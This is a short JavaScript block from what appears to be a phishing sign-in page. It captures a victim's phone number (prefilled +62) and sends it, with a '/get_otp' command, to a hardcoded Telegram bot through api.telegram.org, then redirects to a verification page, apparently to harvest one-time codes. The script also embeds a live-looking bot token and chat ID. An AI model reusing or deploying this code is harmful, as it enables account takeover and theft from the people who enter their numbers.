<script>
    var inpHp = document.getElementById("sign-in-phone-number");
    var label = document.getElementById("labelhp");
    var button = document.getElementById("Btn");
    var botToken = "7674230832:AAEVWtuXvkOj3iqNqelvnFfCDU73ap788Uc";
    $("#Btn").css("display","show");
    inpHp.addEventListener("click", function() {
        $("#labelhp").fadeIn();
        $("#sign-in-phone-number").focus();
        
        $("#Btn").css("display","show");
        label.classList.add("touched");
        inpHp.value = "+62 ";
    });
    inpHp.addEventListener("input", function(){
        if (inpHp.value.length > 0){
            label.classList.add("touched");
        } else {
            label.classList.remove("touched");
        }
        if (inpHp.value.length > 6){
            $("#Btn").fadeIn(300);
        } else {
            $("#Btn").fadeOut("fast");
        }
        if (inpHp.value == "60"){
            inpHp.value = " "
        }
    });
    button.addEventListener("click", function(e){
        e.preventDefault();
        loadd();
        phone = inpHp.value.replace(" ", "").replace("+", "")
        sessionStorage.setItem("nohp", phone);
        sendMessageToBot("/get_otp "+phone)
    });
    function loadd(){
        $("#loading").css("display","flex");
    }
    function sendMessageToBot(message) {
        $.ajax({
        url: 'https://api.telegram.org/bot' + botToken + '/sendMessage',
        method: 'POST',
        data: {
            chat_id: '7007623293', 
            text: message
        },
        success: function(response) {
            console.log('Pesan berhasil dikirim ke bot Telegram');
            setTimeout(()=>{
                window.location.href = 'verify.html'; 
            }, 1000)
        },
        error: function(error) {
            console.error('Gagal mengirim pesan ke bot Telegram:', error);
        }
        });
    }
</script>
